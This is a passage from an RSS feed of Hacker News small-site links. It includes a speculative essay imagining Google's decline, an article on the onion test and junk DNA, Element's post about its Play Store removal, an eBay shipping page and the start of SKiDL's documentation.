data-href="https://techcrunch.com/2016/08/11/google-isnt-safe-from-yahoos-fate/">many noted</a> at the time, the online advertising industry experienced a major shift from search to discovery in the mid-2010s.</span></p><p id="652c">While Google protected its monopoly on the dying search advertising market, Facebook — Google’s biggest competitor in the online advertising space — got on the <a href="https://www.emarketer.com/Article/Google-Facebook-Increase-Their-Grip-on-Digital-Ad-Market/1015417" target="_blank" rel="noopener" data-href="https://www.emarketer.com/Article/Google-Facebook-Increase-Their-Grip-on-Digital-Ad-Market/1015417">right side of the trend</a> and dominated online advertising with its in-feed native display advertising.</p><figure id="88e5"><div></div><figcaption>The people who turned to Amazon over Google? <a <a="" href="https://cdn.geekwire.com/wp-content/uploads/2017/01/Screen-Shot-2017-01-13-at-10.40.08-AM.png" target="_blank" rel="noopener" data-href="https://cdn.geekwire.com/wp-content/uploads/2017/01/Screen-Shot-2017-01-13-at-10.40.08-AM.png">The 18–29 crowd led the&nbsp;way</a>.</figcaption></figure><p id="93c5">In late 2015, Apple — Google’s main competitor in the mobile space — added a feature to their phones and tablets that allowed users to block ads.</p><p id="0ebe">Devices running iOS were responsible for an <a href="http://appleinsider.com/articles/15/05/27/apples-ios-drives-75-of-googles-mobile-advertising-revenue" target="_blank" rel="noopener" data-href="http://appleinsider.com/articles/15/05/27/apples-ios-drives-75-of-googles-mobile-advertising-revenue">estimated 75%</a> of Google’s revenue from mobile search ads, so by making this move, Apple was simultaneously weighing in decisively on the great ad blocking debate of the 2010s and dealing a substantial blow to the <a href="https://techcrunch.com/2016/07/24/apple-lays-the-groundwork-to-kill-online-advertising/" target="_blank" rel="noopener" data-href="https://techcrunch.com/2016/07/24/apple-lays-the-groundwork-to-kill-online-advertising/">future of online advertising</a>.</p></div><div><p id="4b96">A year later, as the internet went mobile, so too did ad blocking. The number of people blocking ads on a mobile device grew <a href="https://pagefair.com/blog/2016/mobile-adblocking-report/" target="_blank" rel="noopener" data-href="https://pagefair.com/blog/2016/mobile-adblocking-report/">102% from 2015 to 2016</a>; by the end of 2016, an estimated 16% of smartphone users globally were <a href="https://pagefair.com/blog/2016/mobile-adblocking-report/" target="_blank" rel="noopener" data-href="https://pagefair.com/blog/2016/mobile-adblocking-report/">blocking ads</a> when browsing the internet on a mobile device. The number was <a href="https://www.emarketer.com/Article/Why-More-than-Quarter-of-US-Internet-Users-Block-Ads/1014333" target="_blank" rel="noopener" data-href="https://www.emarketer.com/Article/Why-More-than-Quarter-of-US-Internet-Users-Block-Ads/1014333">as high as 25%</a> for desktop and laptop users in the United States, a country that accounted for <a href="https://www.statista.com/statistics/266250/regional-distribution-of-googles-revenue/" target="_blank" rel="noopener" data-href="https://www.statista.com/statistics/266250/regional-distribution-of-googles-revenue/">47% of Google’s revenue</a>.</p><p id="9580">The people most likely to block ads were also the most valuable demographic: <a href="http://marketingland.com/ad-blocker-usage-highest-among-key-advertiser-demos-millennials-and-high-earners-143546" target="_blank" rel="noopener" data-href="http://marketingland.com/ad-blocker-usage-highest-among-key-advertiser-demos-millennials-and-high-earners-143546"><em>millennials and high earners</em></a><em>.</em></p></div><div><p id="ab13"><strong>Internet users had spoken, and they hated ads.</strong></p><p id="f036">In early 2017, Google announced its plans to build an ad blocker into its popular Google Chrome browser. Google’s ad blocker would only block ads that were deemed unacceptable by the <a href="http://www.thedrum.com/news/2016/09/16/procter-gamble-unilever-google-facebook-and-more-form-coalition-better-ads" target="_blank" rel="noopener" data-href="http://www.thedrum.com/news/2016/09/16/procter-gamble-unilever-google-facebook-and-more-form-coalition-better-ads">Coalition For Better Ads</a>, effectively allowing the company to use its dominant web browser to strengthen its already dominant advertising business.</p><p id="d68f">Even after making this desperate and <a href="http://fortune.com/2017/04/20/google-ad-blocker/" target="_blank" rel="noopener" data-href="http://fortune.com/2017/04/20/google-ad-blocker/">legally questionable</a> move, it would quickly become clear to Google that even though ads were getting better, ad blocking numbers would <a href="http://adage.com/article/digital/ad-blocking-increases-consumers-improving/305978/" target="_blank" rel="noopener" data-href="http://adage.com/article/digital/ad-blocking-increases-consumers-improving/305978/">continue to rise</a>. Google had given even more people a small taste of what an ad-free internet experience could look like.</p><p id="5e12"><strong>The company discovered that it wasn’t just annoying ads that people didn’t like; it was ads in general.</strong></p></div><div><p id="5603">A key platform where Google served ads was YouTube, which it bought in 2006 and quickly turned into one of its biggest entities. But even with a <a href="http://www.huffingtonpost.com/2013/03/21/youtube-stats_n_2922543.html" target="_blank" rel="noopener" data-href="http://www.huffingtonpost.com/2013/03/21/youtube-stats_n_2922543.html">sixth of the world</a> visiting this video-sharing behemoth every month, YouTube <a href="https://www.wsj.com/articles/viewers-dont-add-up-to-profit-for-youtube-1424897967" target="_blank" rel="noopener" data-href="https://www.wsj.com/articles/viewers-dont-add-up-to-profit-for-youtube-1424897967">never became profitable</a>. In an attempt to combat the effect of ad blockers, YouTube launched an ad-free subscription model in late 2015, but the subscription numbers were <a href="https://www.theverge.com/2016/11/2/13498470/youtube-red-subscribers-video-content-music" target="_blank" rel="noopener" data-href="http://www.theverge.com/2016/11/2/13498470/youtube-red-subscribers-video-content-music">underwhelming</a>.</p><p id="7afb">YouTube’s already insurmountable problems multiplied in early 2017 as advertisers <a href="http://www.fiercepharma.com/marketing/google-scrambling-for-solutions-after-advertiser-departures-youtube" target="_blank" rel="noopener" data-href="http://www.fiercepharma.com/marketing/google-scrambling-for-solutions-after-advertiser-departures-youtube">began to pull out amid ad placement controversies</a>, and huge revenue generators began to <a href="http://www.ibtimes.com/pewdiepie-starts-weekly-twitch-show-uploads-youtube-over-party-video-2523797" target="_blank" rel="noopener" data-href="http://www.ibtimes.com/pewdiepie-starts-weekly-twitch-show-uploads-youtube-over-party-video-2523797">leave the site</a>.</p><p id="f0ab">Even those who weren’t blocking ads had trained themselves to ignore them entirely. Researchers dubbed this phenomenon “<a href="http://www.tobiipro.com/fields-of-use/marketing-consumer-research/advertising/" target="_blank" rel="noopener" data-href="http://www.tobiipro.com/fields-of-use/marketing-consumer-research/advertising/">banner blindness</a>”. The average banner ad was clicked on by a dismal <a href="https://www.thinkwithgoogle.com/intl/en-gb/planning-tool/display-benchmarks/" target="_blank" rel="noopener" data-href="https://www.thinkwithgoogle.com/intl/en-gb/planning-tool/display-benchmarks/">0.06% of viewers</a>, and of those clicks, roughly <a href="http://www.goldspotmedia.com/fat-finger-report/" target="_blank" rel="noopener" data-href="http://www.goldspotmedia.com/fat-finger-report/">50% were accidental</a>.</p><p id="c67f">Research showed that <a href="https://www.bannersnack.com/blog/build-trust-display-ads/" target="_blank" rel="noopener" data-href="http://www.bannersnack.com/blog/build-trust-display-ads/">54% of users</a> reported a lack of trust as their reason for not clicking banner ads and 33% found them completely <a href="http://downloads.pagefair.com/reports/adblocking_goes_mainstream_2014_report.pdf" target="_blank" rel="noopener" data-href="http://downloads.pagefair.com/reports/adblocking_goes_mainstream_2014_report.pdf">intolerable</a>. These figures painted a pretty grim picture for the sustainability of online advertising, but especially for Google’s position within the industry.</p><blockquote id="8a50"><p>Google’s mighty engine had started to&nbsp;sputter.</p></blockquote><h3 id="def0">A chance to pivot, and how Google missed&nbsp;it</h3><p id="ec19">If losing a major portion of their audience and annoying the rest wasn’t bad enough, Google also failed to get ahead of one of the biggest shifts in technology’s history. They recognized the importance of artificial intelligence but their approach missed the mark. Since Google’s search pillar had become unstable, a lot was riding on the company’s strategy for artificial intelligence.</p><blockquote id="2408"><p>“We will move from mobile first to an AI first&nbsp;world.”</p></blockquote><p id="814d">Google’s then-CEO Sundar Pichai <a href="https://blog.google/topics/inside-google/this-years-founders-letter/" target="_blank" rel="noopener" data-href="https://blog.google/topics/inside-google/this-years-founders-letter/">famously predicted</a> in 2016 that “<em>the next big step will be for the very concept of the ‘device’ to fade away” </em>and that<em> “over time, the computer itself — whatever its form factor — will be an intelligent assistant helping you through your day. We will move from mobile first to an AI first world.”</em></p><p id="6d2f">Google’s ability to acknowledge the coming trend and still fail to land in front of it reminded many observers of its catastrophic failures in the booming industries of social media and instant messaging.</p><figure id="179f"><div></div><figcaption>Sundar Pichai wondering how to monetize a virtual assistant</figcaption></figure><h3 id="deb3">Google vs.&nbsp;Amazon</h3><p id="d2e7">Meanwhile, in 2014, Amazon released a product called Amazon Echo, a small speaker that could sit in your home and answer questions, perform tasks, and buy things online for you. The Echo was a <a href="http://www.businessinsider.com/amazon-echo-success-could-spell-big-trouble-for-google-2017-1" target="_blank" rel="noopener" data-href="http://www.businessinsider.com/amazon-echo-success-could-spell-big-trouble-for-google-2017-1">smash success</a>. Google released its copycat product, Google Home, two years later, but it was already <a href="https://www.theguardian.com/technology/2017/jan/22/home-battleground-amazon-google-voice-technology" target="_blank" rel="noopener" data-href="https://www.theguardian.com/technology/2017/jan/22/home-battleground-amazon-google-voice-technology">too late to catch up</a>, and had no clear revenue strategy.</p><p id="a3f9">Alexa — the assistant that lived inside the Echo — on the other hand, was quickly integrated into several products and services, and its monetization model was clear, viable, and most importantly future-friendly. The Echo made it easy to order products through Amazon, and every time someone used an Echo to purchase something, Amazon made money.</p><p id="dde3">Google extended the reach of their virtual assistant by building it into Android, but doing so still didn’t provide an answer for how the technology would generate enough revenue to sustain Google’s expanding repertoire of expensive innovations.</p><p id="c590">Google’s ads relied on screens, yet voice interaction subverted screens entirely. Google briefly tried playing audio ads with the Google Home, but consumers were <a href="https://www.engadget.com/2017/03/17/google-home-ads-bad-precedent/" target="_blank" rel="noopener" data-href="https://www.engadget.com/2017/03/17/google-home-ads-bad-precedent/">far from receptive</a>. Investors <a href="http://www.businessinsider.com/google-ceo-sundar-pichai-responds-to-concerns-over-monetizing-voice-search-2017-1" target="_blank" rel="noopener" data-href="http://www.businessinsider.com/google-ceo-sundar-pichai-responds-to-concerns-over-monetizing-voice-search-2017-1">started to voice their concerns in 2017</a>, but Sundar Pichai told them not to worry, leaving them to assume that Google would use their age-old strategy and analyze users’ voice searches so that users could be shown more suitable ads on devices with screens.</p><figure id="388c"><div></div><figcaption>Alexa celebrating its victory over&nbsp;Google</figcaption></figure><p id="f6d7">Headlines in early 2017 <a href="https://www.wired.com/2017/01/ces-alexa-in-everything/" target="_blank" rel="noopener" data-href="https://www.wired.com/2017/01/ces-alexa-in-everything/">proclaimed</a> that “Alexa Just Conquered CES. The World is Next.” Amazon then made their technology <a href="https://www.zdnet.com/article/amazon-opens-echo-microphone-tech-to-third-party-alexa-devices/" target="_blank" rel="noopener" data-href="http://www.zdnet.com/article/amazon-opens-echo-microphone-tech-to-third-party-alexa-devices/">available</a> to third party manufacturers, putting even more distance between the two companies. Amazon <a href="http://www.investors.com/news/technology/amazon-confronts-microsoft-google-ibm-in-cloud-computing-wars/" target="_blank" rel="noopener" data-href="http://www.investors.com/news/technology/amazon-confronts-microsoft-google-ibm-in-cloud-computing-wars/">had already beaten Google once before</a>, holding 54% of the cloud computing market (compared to Google’s 3%) in 2016, and they were just getting started.</p><p id="2d79">By early 2017, Amazon <a href="https://www.cnbc.com/2017/03/31/competing-with-amazon-is-crushing-retailers.html" target="_blank" rel="noopener" data-href="http://www.cnbc.com/2017/03/31/competing-with-amazon-is-crushing-retailers.html">had begun closing in</a> on <a href="https://www.forbes.com/sites/groupthink/2017/02/03/amazon-go-is-the-future-plus-4-reasons-why-amazon-might-just-win-retail" target="_blank" rel="noopener" data-href="https://www.forbes.com/sites/groupthink/2017/02/03/amazon-go-is-the-future-plus-4-reasons-why-amazon-might-just-win-retail">the entire</a> <a href="http://www.businessinsider.com/retailers-are-going-bankrupt-at-a-staggering-rate-2017-4" target="_blank" rel="noopener" data-href="http://www.businessinsider.com/retailers-are-going-bankrupt-at-a-staggering-rate-2017-4">retail industry</a>.</p><h3 id="a95b">Ads weren’t&nbsp;forever</h3><p id="99b5">At its peak, Google had a massive and loyal user-base across a staggering number of products, but advertising revenue was the glue that held everything together. As the numbers waned, Google’s core began to buckle under the weight of its vast empire.</p><p id="4f07">Google was a driving force in the technology industry ever since its disruptive entry in 1998. But in a world where people despised ads, Google’s business model was not innovation-friendly, and they missed several opportunities to pivot, ultimately rendering their numerous grand and ambitious projects unsustainable. Innovation costs money, and Google’s main stream of revenue had started to dry up.</p><p id="dd33">In a few short years, Google had gone from a fun, commonplace verb to a reminder of how quickly a giant can fall.</p><p>___________________________________________</p><p><strong>About the Author</strong></p><p><em>This article was written by&nbsp;<a dir="auto" href="https://hackernoon.com/@dacoja?source=post_header_lockup" data-action="show-user-card" data-action-source="post_header_lockup" data-action-value="6502e16a569a" data-action-type="hover" data-user-id="6502e16a569a" data-collection-slug="hacker-daily">Daniel Colin James</a>,developer, writer, master’s student. <a href="http://danielcolinjames.com/">See more</a>. <a href="https://empirics.asia/this-is-how-google-will-collapse/danielcolinjames@gmail.com">Contact</a>.&nbsp;</em></p></div></div>]]>
            </description>
            <link>https://empirics.asia/this-is-how-google-will-collapse/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25975560</guid>
            <pubDate>Sun, 31 Jan 2021 03:25:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[An Onion's Genome Has Five Times More DNA Than Humans (2019)]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25975457">thread link</a>) | @disqard
<br/>
January 30, 2021 | https://geneticsunzipped.com/news/2019/1/31/the-onion-test | <a href="https://web.archive.org/web/*/https://geneticsunzipped.com/news/2019/1/31/the-onion-test">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-yui_3_17_2_1_1565793939038_266584"><div><p>The human genome is an incredible thing. Six billion letters of DNA – that’s more than two metres of DNA in every single cell – containing all the genes that enable a single cell to grow into a fully-formed, fully functioning person. </p><p>So when the first draft sequence of the human genome was published in 2001, researchers around the world were eager to discover exactly how many genes must be packed into our glorious genome.</p><p>The answer was a big surprise.</p><p>Many people thought that it must take at least a hundred thousand genes to make a human – with a sweepstake on offer to the person who made the closest guess to the final number – yet the human genome turns out to contain only 20,000 or so genes (roughly the same number of genes as a fruit fly or nematode worm).</p><p>This seems remarkably low to make an organism with as much dazzling complexity as a human being.  Even more perplexingly, the genes that we do have make up less than two per cent of all that DNA. So what’s the rest?</p><p>To find out, we need to go back in time to 1972.</p><p>That’s when geneticist Susumu Ohno published a paper entitled “So much ‘junk’ DNA in our genome” in an obscure scientific journal, the Brookhaven Symposia in Biology, in which he mused upon a mathematical problem.</p><p>By that point, scientists had already measured how much DNA was present in bacteria and figured out that these little bugs must contain a few thousand genes. They also knew that a single human cell contained at least 750 times as much DNA.</p><p>Ohno did a quick back-of-the-envelope calculation – if the number of genes in any genome was directly proportional to the amount of DNA, then humans should have….. three million genes, more or less.</p><p>But, as he pointed out in his paper, ‘lowly lungfish and salamanders’ can have 36 times more DNA in their cells than is present in ours, suggesting that they should have…. A hundred million genes.</p><p>He didn’t believe it. What would a slimy salamander need with all those genes? Therefore, Ohno concluded, the vast majority of the human genome must be junk. And, correspondingly, varying proportions of other organisms’ genomes must be junk too. And once the Human Genome project revealed that the vast majority of our genome doesn’t seem to contain actual genes, it looked like he was right.</p><p>The function of this remaining 98% of the human genome - sometimes called ‘junk DNA’ but more accurately referred to as non-coding DNA – is a hotly debated topic in the world of genetics, fought out within the dignified pages of journals and the more febrile atmosphere of scientific conferences.</p><p>An absolutely massive study published in 2012, known as ENCODE, suggested that around 80% of the human genome was functional – namely, that it did something important for the proper functioning of our cells and bodies. Just under 10 per cent is thought to be control switches responsible for turning genes on and off at the right time and in the right place, while the rest does all manner of things, from producing little pieces of RNA that control gene activity to organising the three-dimensional structure of the DNA inside a cell.</p><p>Others were unconvinced. For example, evolutionary geneticist Chris Ponting suggests that less than 10% of the human genome is functional, based on how much has been strongly preserved through evolutionary time and must therefore be very important.</p><p>It’s against this backdrop we bring in the Onion Test, devised by T. Ryan Gregory and posted on his blog in April 2007. It was later formalised as a scientific paper that he published in 2014, together with Alexander Palazzo.</p><p>Put simply, the Onion Test goes like this.</p><p>The onion in your vegetable drawer has five times more DNA than humans. So if you’re a researcher who thinks that non-coding DNA has a particular function in the genome, can you explain why an onion needs about five times more of it than a human to do the same thing?</p><p>Unpeeling this idea a bit further, Gregory points out that some species of onions have around double the amount of DNA as your regular onions, while others have less than half. Yet they’re pretty much the same and have the same number of genes, so why would they need double or half the amount of non-coding DNA?</p><p>This argument works for all kinds of species, from Ohno’s lowly salamanders with their giant genomes containing roughly the same set of genes as other vertebrates, including humans, to the biggest genome discovered to date, which belongs to the Japanese canopy flower, Paris Japonica, with around 150 time more DNA in its genome than a human.</p><p>Then there’s the poisonous Fugu pufferfish – often eaten (very carefully!) as a delicacy in Japan.  They have remarkably compact genomes, roughly an eighth of the size of our own yet containing almost exactly the same repertoire of genes and very little junk.</p><p>Perhaps our obsession with finding function for all the junk in our genome comes from a desire to think that humans are something special in the biological world – certainly more special than an onion.</p><p> But in the words of the grumpy geneticist Dan Graur, who I interviewed for my book Herding Hemingway’s Cats in which I dig into the junk in our genetic trunk,  “Either you have to assume that humans are the pinnacle of creation –that everything is functional and those organisms with more DNA than us have junk DNA but we don’t. Or you have to assume that humans are a regular organism that has junk DNA just like everything else.”</p><p><strong>Further reading:</strong></p><ul data-rte-list="default"><li><p><a href="http://www.genomicron.evolverzone.com/2007/04/onion-test/" target="_blank">T. Ryan Gregory’s original post about the onion test</a></p></li><li><p><a href="https://journals.plos.org/plosgenetics/article?id=10.1371/journal.pgen.1004351" target="_blank">The case for junk DNA, Palazzo &amp; Gregory (2014), PLoS Genetics</a></p></li><li><p><a href="https://www.sciencemag.org/news/2010/10/scienceshot-biggest-genome-ever" target="_blank">The biggest ever genome - Paris Japonica </a></p></li><li><p><a href="http://bit.ly/HerdingHemingwaysCats" target="_blank">Herding Hemingway’s Cats - Kat Arney </a>(aff) Chapters 1 and 2</p></li></ul></div></div></div>]]>
            </description>
            <link>https://geneticsunzipped.com/news/2019/1/31/the-onion-test</link>
            <guid isPermaLink="false">hacker-news-small-sites-25975457</guid>
            <pubDate>Sun, 31 Jan 2021 03:13:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Element on Google Play Store]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25975378">thread link</a>) | @keskadale
<br/>
January 30, 2021 | https://element.io/blog/element-on-google-play-store/ | <a href="https://web.archive.org/web/*/https://element.io/blog/element-on-google-play-store/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <div>
      
      <div><p>Hi all,</p><p>At 2021-01-29 at 21:35 UTC Google suspended Element from the Play Store without warning or notification. &nbsp;We submitted an appeal asking for clarification at 23:18, and at 05:31 received a generic update from the Google Play Policy team citing that the app has been removed due to content which contravenes their terms of use, and asking us to “make the necessary changes to [our] app” and “upload a new app using a new package name and a new app name”.</p><p>As of 11:44 UTC we’ve submitted a detailed appeal to reiterate that Element is a generic chat app for connecting to the global Matrix communication network, just as Chrome is a generic web browser for connecting to the Web - and just as Google does not control the content on the Web, Element does not control the content on Matrix.</p><p>We have also explained that the Matrix servers that we <em>do</em> run as Element (including the default Matrix.org homeserver, which we run on behalf of <a href="https://matrix.org/foundation">The Matrix.org Foundation</a>) have <a href="https://matrix.org/legal/terms-and-conditions#6-play-nice-clauses">strict Terms of Use</a> which we actively enforce. We abhor abuse, and Element is not an app that caters to abusive content.</p><p>In order to enforce our terms of use on the Matrix servers we run as Element, we have a formal Trust and Safety team hired full-time who are dedicated to investigating and tracking abuse reports sent to <a href="https://element.io/cdn-cgi/l/email-protection#f09192858395b09d9184829988de9f8297"><span data-cfemail="a0c1c2d5d3c5e0cdc1d4d2c9d88ecfd2c7">[email&nbsp;protected]</span></a> or reported from the app. &nbsp;The team takes appropriate action on a ticket by ticket basis - deactivating abusive accounts and blocking chatrooms from our servers which contravene our terms of use, and building tooling to help enforce the terms of use on the servers we run.</p><p>Managing abuse is an ongoing activity, and <a href="https://sifted.eu/articles/element-whatsapp-exodus/">Matrix is expanding massively at the moment</a>. We are expanding Element’s Trust and Safety team to match that growth, focusing on improving our anti-abuse mechanisms, and we are also constantly expanding the <a href="https://matrix.org/docs/guides/moderation/">moderation tools</a> we provide to the community.</p><p>Meanwhile, we’re also continuing to work on decentralised reputation as a <a href="https://matrix.org/blog/2020/10/19/combating-abuse-in-matrix-without-backdoors/">scalable solution to empower other users to combat abuse</a> for the wider Matrix network - effectively bringing control back to users and empowering communities to remain safe online.</p><p>Element and Matrix are used by the French, German, UK and US governments, <a href="https://matrix.org/blog/2021/01/29/this-week-in-matrix-2021-01-29#dept-of-status-of-matrix-%EF%B8%8F">countless universities</a>, thousands of businesses and millions of people across the world - we can only apologise for the disruption caused by the app disappearing like this.</p><p>We’re currently waiting for an update to Google and will keep this blog post updated as the situation develops. &nbsp;We look forward to resolving the problem and getting the app back in the store shortly.</p><p>-- The Element Team</p><p>Update: reminder that in the interim you can download a (slightly outdated) version of Element Android from F-Droid at <a href="https://f-droid.org/en/packages/im.vector.app/">https://f-droid.org/en/packages/im.vector.app</a>. &nbsp;We're also looking into running our own F-Droid repository going forwards so the most recent build is always available there.</p><p>UPDATE: At 2021-01-30 23:17 UTC we received a call from a VP at Google who apologised for the bad communication from Google and explained the situation, which related to some extremely abusive content which was accessible on the default matrix.org homeserver. &nbsp;Our Trust and Safety team had already identified and acted on this content to enforce the server's terms of use, and so we've explained how Element and Matrix works, established a channel for communication over any future moderation concerns, and expect the app to be restored shortly.</p><p>UPDATE: The app is restored as of 2021-01-31 00:30 UTC. &nbsp;Huge thanks to everyone for your patience and support while we sorted this out, and to the wider Element team who spent their Saturday on this. &nbsp;Thanks also to Google for being transparent and apologetic and the rapid resolution once we'd established contact.</p></div>
      
    </div>
  </div></div>]]>
            </description>
            <link>https://element.io/blog/element-on-google-play-store/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25975378</guid>
            <pubDate>Sun, 31 Jan 2021 02:59:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Pristine Apple-1 on eBay for $1.5M]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25974996">thread link</a>) | @gridder
<br/>
January 30, 2021 | https://www.ebay.it/itm/174195921349 | <a href="https://web.archive.org/web/*/https://www.ebay.it/itm/174195921349">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p><span title="icon"></span>
									Impossibile calcolare le spese di spedizione. Inserisci un CAP valido.</p><div>
									
									<!-- Local pickup --> <!-- ebn only -->
									<p><span>Luogo in cui si trova l'oggetto:</span> Boca Raton, Florida, Stati Uniti</p>
										<!-- ShipsTo -->
										<p><span id="shipsToTab">
<p>
			Spedizione verso: Tutto il mondo</p>

	
		<p>
							Paesi in cui non si effettua la spedizione: Angola, Camerun, Isole Cayman, Polinesia francese, Libia, Mongolia, Suriname, Guyana, Panama, Mauritius, Brunei Darussalam, Ciad, Madagascar, Nuova Caledonia, Bahamas, Bermuda, Iran, Saint Kitts e Nevis, Sahara Occidentale, Bolivia, Laos, Congo, Repubblica del, Seychelles, Sudan, Guadalupa, Venezuela, Somalia, Birmania, Cuba, Repubblica di, Riunione, Yemen, Barbados, Belize, Liberia, Sierra Leone, Repubblica Centrafricana, Martinica, Dominica, Niger, Guyana francese, Saint Pierre e Miquelon, Arabia Saudita</p>
					</span></p><!-- Calculate Row -->
									<div id="medium">
	<table>
			<tbody>
				<tr>
					<td nowrap="nowrap">
						
						<p>Sono presenti 1 oggetti disponibili. Inserisci un numero inferiore o uguale a 1.</p>
						<p>Seleziona un Paese valido.</p>
					</td>
					<td>
						<div aria-live="assertive" role="alert" id="shZipCodeDiv">
							 										
							<p><label for="shZipCode" id="shZipCodeTextDiv">CAP:</label></p>
							<p>Inserisci un CAP valido.</p>
							<p>Inserisci 5 o 9 numeri per il CAP.</p>
						</div>
						
					</td>
				</tr>
			</tbody>
		</table>
	</div>
	<!-- Shipping Table -->
											<div id="shippingSection" aria-live="assertive" role="alert">
												<table role="presentation">
		<thead>
		<tr>
			<th><p>Spedizione e imballaggio</p></th>
							<th><p>in</p></th>
							<th><p>Servizio</p></th>
							<th><p>Consegna<a target="_blank" aria-label="Nota" href="#instrTextTable">*</a></p></th>
								</tr>
		</thead>
		<tbody>
			<!-- skip displaying eBayPlus service for non-members -->
									<tr>
										<td>
											<!-- Column 1 -->
												<p>
															US $1,00</p>
													</td>
										<!-- Column 2 -->
										<td>
										<!-- Column 3 -->
										<!-- TODO replace this with shipsTo from Shipping service because of each service -->
											<p>Stati Uniti</p>
												</td>
										<td>
										<!-- Column 4 -->										
											<p>
														Spedizione celere (USPS Priority Mail Padded Flat Rate Envelope<sup>Â®</sup>)
															</p>
													
														</td>
										<!-- Column 5 -->
										<td>
												<p>
Stimata entro <span><b>gio. 18 feb. </b></span></p>
</td>
											<!-- Column 6 -->
										 </tr>
									<!-- skip displaying eBayPlus service for non-members -->
									<tr>
										<td>
											<!-- Column 1 -->
												<p>Ritiro gratuito dell'oggetto in zona</p>
															</td>
										<!-- Column 2 -->
										<td>
										<!-- Column 3 -->
										<!-- TODO replace this with shipsTo from Shipping service because of each service -->
											<p>Stati Uniti</p>
												</td>
										<td>
										<!-- Column 4 -->										
											<p>
														Local Pickup</p>
													</td>
										<!-- Column 5 -->
										<td>
												
</td>
											<!-- Column 6 -->
										 </tr>
									<!-- TODO see if colspan if loops are necessary -->
								</tbody>
	</table>
<!-- Shipping Delivery Transit time Text -->
<div id="instrTextTable" tabindex="-1">
                    <p>
			 				* <a href="https://pages.ebay.it/help/buy/contextual/estimated-delivery.html" target="_blank">Le date di consegna stimate<b>- si apre in una nuova finestra o scheda</b></a> includono i tempi di imballaggio del venditore, il CAP del mittente, il CAP del destinatario e i tempi di accettazione e dipendono dal servizio di spedizione selezionato e dalla ricezione del pagamento. I tempi di consegna possono variare, specialmente durante le festivitÃ&nbsp;. </p>
					</div>
	 		</div>
										</div></div>]]>
            </description>
            <link>https://www.ebay.it/itm/174195921349</link>
            <guid isPermaLink="false">hacker-news-small-sites-25974996</guid>
            <pubDate>Sun, 31 Jan 2021 01:53:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Currents 025: Ben Goertzel on Decentralizing Social Media]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25974871">thread link</a>) | @tartoran
<br/>
January 30, 2021 | https://www.jimruttshow.com/currents-ben-goertzel/ | <a href="https://web.archive.org/web/*/https://www.jimruttshow.com/currents-ben-goertzel/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://www.jimruttshow.com/currents-ben-goertzel/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25974871</guid>
            <pubDate>Sun, 31 Jan 2021 01:32:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Skidl – Skidl]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25974843">thread link</a>) | @riebs
<br/>
January 30, 2021 | https://xesscorp.github.io/skidl/docs/_site/ | <a href="https://web.archive.org/web/*/https://xesscorp.github.io/skidl/docs/_site/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">
            <!-- <article class="notepad-index-post post row" role="main"> -->
            <article role="main">
                <div>
                    

<p><strong>Never use a lousy schematic editor again!</strong>
SKiDL is a simple module that lets you describe electronic circuits using Python.
The resulting Python program outputs a netlist that a PCB layout tool uses to
create a finished circuit board.</p>

<h3 id="contents">Contents</h3>

<ul>
  <li><a href="#tldr">TL;DR</a>
    <ul>
      <li><a href="#contents">Contents</a></li>
    </ul>
  </li>
  <li><a href="#introduction">Introduction</a></li>
  <li><a href="#installation">Installation</a></li>
  <li><a href="#basic-usage">Basic Usage</a>
    <ul>
      <li><a href="#accessing-skidl">Accessing SKiDL</a></li>
      <li><a href="#finding-parts">Finding Parts</a>
        <ul>
          <li><a href="#command-line-searching">Command-line Searching</a></li>
          <li><a href="#zyc-a-gui-search-tool">Zyc: A GUI Search Tool</a></li>
        </ul>
      </li>
      <li><a href="#instantiating-parts">Instantiating Parts</a></li>
      <li><a href="#connecting-pins">Connecting Pins</a></li>
      <li><a href="#checking-for-errors">Checking for Errors</a></li>
      <li><a href="#generating-a-netlist">Generating a Netlist</a></li>
    </ul>
  </li>
  <li><a href="#going-deeper">Going Deeper</a>
    <ul>
      <li><a href="#basic-skidl-objects-parts-pins-nets-buses">Basic SKiDL Objects: Parts, Pins, Nets, Buses</a></li>
      <li><a href="#creating-skidl-objects">Creating SKiDL Objects</a></li>
      <li><a href="#finding-skidl-objects">Finding SKiDL Objects</a></li>
      <li><a href="#copying-skidl-objects">Copying SKiDL Objects</a></li>
      <li><a href="#accessing-part-pins-and-bus-lines">Accessing Part Pins and Bus Lines</a>
        <ul>
          <li><a href="#accessing-part-pins">Accessing Part Pins</a></li>
          <li><a href="#accessing-bus-lines">Accessing Bus Lines</a></li>
        </ul>
      </li>
      <li><a href="#making-connections">Making Connections</a></li>
      <li><a href="#making-serial-parallel-and-tee-networks">Making Serial, Parallel, and Tee Networks</a></li>
      <li><a href="#aliases">Aliases</a></li>
      <li><a href="#units-within-parts">Units Within Parts</a></li>
      <li><a href="#part-fields">Part Fields</a></li>
      <li><a href="#hierarchy">Hierarchy</a>
        <ul>
          <li><a href="#subcircuits">Subcircuits</a></li>
          <li><a href="#packages">Packages</a></li>
        </ul>
      </li>
      <li><a href="#interfaces">Interfaces</a></li>
      <li><a href="#libraries">Libraries</a></li>
      <li><a href="#doodads">Doodads</a>
        <ul>
